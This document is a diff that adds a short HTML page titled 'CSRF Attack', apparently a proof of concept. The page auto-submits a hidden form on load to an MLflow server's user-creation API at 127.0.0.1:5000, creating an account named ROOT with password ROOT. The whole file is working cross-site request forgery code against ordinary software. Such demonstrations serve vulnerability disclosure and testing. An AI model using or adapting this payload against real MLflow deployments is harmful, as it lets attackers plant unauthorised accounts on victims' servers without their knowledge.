@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack</title>
+</head>
+<body onload="document.forms['csrfForm'].submit();">
+  <form id="csrfForm" action="http://127.0.0.1:5000/api/2.0/mlflow/users/create" method="POST">
+    <input type="hidden" name="username" value="ROOT">
+    <input type="hidden" name="password" value="ROOT">
+  </form>
+</body>
+</html>
